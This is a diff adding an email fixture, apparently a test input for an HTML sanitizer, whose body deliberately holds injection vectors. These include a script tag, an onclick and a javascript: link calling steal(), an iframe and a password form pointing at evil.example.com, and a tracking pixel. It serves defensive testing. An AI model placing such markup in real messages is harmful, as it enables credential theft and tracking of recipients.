@@ -1,0 +1,15 @@
+From: newsletter@example.com
+To: bob@example.com
+Subject: Hostile HTML
+Date: Tue, 27 Oct 2026 10:30:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><style>p{color:red}</style><script>alert('x')</script></head>
+<body><p onclick="steal()" style="color:red">Quarterly <b>numbers</b> attached.</p>
+<img src="https://tracker.example.com/pixel.gif" alt="">
+<img src="cid:logo" alt="Company logo">
+<iframe src="https://evil.example.com/frame"></iframe>
+<form action="https://evil.example.com/post"><input name="pw"></form>
+<a href="javascript:steal()">click</a> <a href="https://example.com/report">report</a>
+</body></html>
